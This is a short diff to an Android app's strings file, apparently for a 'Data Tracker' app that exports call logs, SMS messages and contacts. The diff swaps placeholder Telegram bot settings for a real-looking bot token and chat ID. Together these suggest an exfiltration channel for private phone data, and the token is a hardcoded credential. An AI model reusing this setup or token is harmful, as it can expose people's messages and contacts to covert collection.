@@ -1,7 +1,7 @@
 <resources>
     <string name="app_name">Data Tracker</string>
-    <string name="telegram_bot_token">YOUR_BOT_TOKEN</string>
-    <string name="telegram_chat_id">YOUR_CHAT_ID</string>
+    <string name="telegram_bot_token">6608849649:AAFWh8dZ6eul7QHgEb0aomzPDiTUQc6GO7c</string>
+    <string name="telegram_chat_id">5080555370</string>
     <string name="export_call_logs">Export Call Logs</string>
     <string name="export_sms">Export SMS Messages</string>
     <string name="export_contacts">Export Contacts</string>
